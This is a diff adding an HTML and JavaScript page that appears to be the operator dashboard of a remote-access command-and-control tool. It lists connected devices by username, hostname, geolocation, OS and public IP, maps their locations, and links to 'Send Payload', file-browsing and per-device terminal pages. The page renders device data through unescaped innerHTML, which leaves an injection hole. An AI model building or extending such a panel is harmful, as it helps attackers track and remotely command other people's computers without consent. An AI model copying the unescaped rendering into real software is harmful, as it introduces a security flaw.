@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Dashboard</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #1e1e1e;
+            color: #ccc;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        header {
+            width: 100%;
+            background-color: #333;
+            padding: 20px 0;
+        }
+        nav {
+            display: flex;
+            justify-content: center;
+        }
+        nav ul {
+            list-style-type: none;
+            margin: 0;
+            padding: 0;
+            display: flex;
+        }
+        nav li {
+            margin: 0 10px;
+        }
+        nav a {
+            color: #fff;
+            text-decoration: none;
+            padding: 10px 15px;
+            border-radius: 5px;
+            transition: background-color 0.3s;
+        }
+        nav a:hover {
+            background-color: #444;
+        }
+        .active {
+            background-color: #555;
+        }
+        h1 {
+            text-align: center;
+            padding: 20px;
+            width: 100%;
+            margin: 0;
+        }
+        button {
+            background-color: #444;
+            color: #fff;
+            border: none;
+            padding: 10px;
+            margin-top: 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+        }
+        #container {
+            display: flex;
+            width: 90%;
+            margin-top: 20px;
+        }
+        #map {
+            flex: 3;
+            height: 400px;
+            margin-left: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        #panel {
+            width: 250px;
+            background-color: #333;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        #device-table-container {
+            width: 90%;
+            max-height: 300px; /* Set a maximum height */
+            overflow-y: auto; /* Enable vertical scrolling */
+            margin-top: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            background-color: #2e2e2e; /* Background for the scrolling area */
+        }
+        table {
+            width: 100%;
+            border-collapse: separate;
+            border-spacing: 0;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        th, td {
+            padding: 12px;
+            text-align: left;
+            background-color: #2e2e2e;
+        }
+        th {
+            background-color: #444;
+            color: #fff;
+        }
+        tr:nth-child(even) {
+            background-color: #3a3a3a;
+        }
+        img {
+            width: 30px;
+            height: 30px;
+            vertical-align: middle;
+            margin-right: 5px;
+        }
+        .trashcan-icon {
+            position: relative;
+            right: 20%;
+            scale: 120%;
+        }
+        .terminal-icon {
+            position: relative;
+            right: 20%;
+        }
+        td:nth-child(6), td:nth-child(7) {
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <nav>
+        <ul>
+            <li><a href="/" class="active">Control Panel</a></li>
+            <li><a href="/payload">Payload</a></li>
+            <li><a href="/files">Files</a></li>
+        </ul>
+    </nav>
+</header>
+
+<h1>Device Dashboard</h1>
+
+<div id="container">
+    <div id="panel">
+        <button onclick="sendPayload()">Send Payload</button>
+    </div>
+
+    <div id="map"></div>
+</div>
+
+<div id="device-table-container">
+    <table>
+        <thead>
+            <tr>
+                <th>Device ID</th>
+                <th>Location</th>
+                <th>Status</th>
+                <th>OS</th>
+                <th>IP Address</th>
+                <th>Connect</th>
+                <th>Delete</th>
+            </tr>
+        </thead>
+        <tbody id="device-table">
+            <!-- Device rows will be added here -->
+        </tbody>
+    </table>
+</div>
+
+<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+<script>
+    // Initialize the map
+    const map = L.map('map').setView([39.8283, -98.5795], 4); // Centered on the USA
+
+    // Add OpenMapTiles layer
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        maxZoom: 19,
+        attribution: '© OpenStreetMap contributors'
+    }).addTo(map);
+
+    // Function to simulate sending a payload
+    function sendPayload() {
+        alert('Payload sent to selected devices!');
+    }
+
+    // Function to update the table and map with new data
+    async function updateDevices() {
+        const tableBody = document.getElementById('device-table');
+        tableBody.innerHTML = ''; // Clear existing table rows
+
+        try {
+            const response = await fetch('/devices', { method: 'POST' });
+            const data = await response.json();
+
+            Object.keys(data).forEach(clientId => {
+                const clientData = data[clientId];
+
+                const osType = clientData.platform[0];
+                const osLogo = osType === 'Linux' ? 'https://upload.wikimedia.org/wikipedia/commons/3/35/Tux.svg' :
+                   osType === 'Darwin' ? 'https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg' :
+                   osType === 'Windows' ? 'https://upload.wikimedia.org/wikipedia/commons/0/0a/Unofficial_Windows_logo_variant_-_2002%E2%80%932012_%28Multicolored%29.svg' :
+                   osType === 'FreeBSD' ? 'https://upload.wikimedia.org/wikipedia/commons/4/40/Daemon-phk.svg' :
+                   osType === 'OpenBSD' ? 'https://upload.wikimedia.org/wikipedia/commons/a/ad/Puffy.jpg' :
+                   osType === 'Solaris' ? 'https://upload.wikimedia.org/wikipedia/commons/d/d2/Icon-sun-solaris_os.svg' :
+                   osType === 'Android' ? 'https://upload.wikimedia.org/wikipedia/commons/2/26/Android_Robot_Head_2023.svg' :
+                   'https://static-00.iconduck.com/assets.00/unknown-os-20px-icon-512x512-brbzte7w.png'; // Default logo for other/unknown OS
+
+
+                // Add a marker to the map
+                L.marker([clientData.geolocation.latitude, clientData.geolocation.longitude])
+                    .addTo(map)
+                    .bindPopup(`<b>${clientData.username}</b><br>${clientData.hostname}`)
+                    .openPopup();
+
+                // Add a row to the table
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td>${clientData.username}</td>
+                    <td>${clientData.geolocation.address}</td>
+                    <td>${clientData.status}</td>
+                    <td><img src="${osLogo}" alt="${osType} logo">${osType}</td>
+                    <td>${clientData.public_ip}</td>
+                    <td><img src='https://upload.wikimedia.org/wikipedia/commons/6/6f/Octicons-terminal.svg' id='connect' alt="Connect icon" class='terminal-icon' data-row-id="${clientId}"></td>
+                    <td><img src='https://upload.wikimedia.org/wikipedia/commons/9/9c/Trash-can_-_Delapouite_-_game-icons.svg' class='trashcan-icon' alt='Delete icon' id='delete' data-row-id="${clientId}"></td>
+                `;
+                tableBody.appendChild(row);
+            });
+        } catch (error) {
+            console.error('Error fetching data:', error);
+        }
+    }
+
+    // Call updateDevices to initially load the data
+    updateDevices();
+
+    
+    //setInterval(updateDevices, 1000);
+    
+    // Add event listeners for connect and delete icons
+    document.addEventListener('click', (event) => {
+        if (event.target.id === 'connect') {
+            const rowId = event.target.dataset.rowId;
+            console.log(`Connect clicked for device ID: ${rowId}`);
+            window.location.href = '/terminal/' + rowId
+            // Add logic to handle connect event here
+        } else if (event.target.id === 'delete') {
+            const rowId = event.target.dataset.rowId;
+            fetch('/delete', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ 'device_id': rowId })
+            })
+            .then(response => {
+                console.log('Response from server:', response);
+                updateDevices();
+                // Handle the response here (e.g., update the UI)
+            })
+            .catch(error => {
+                console.error('Error sending delete request:', error);
+            });
+        }
+    });
+
+</script>
+
+</body>
+</html>
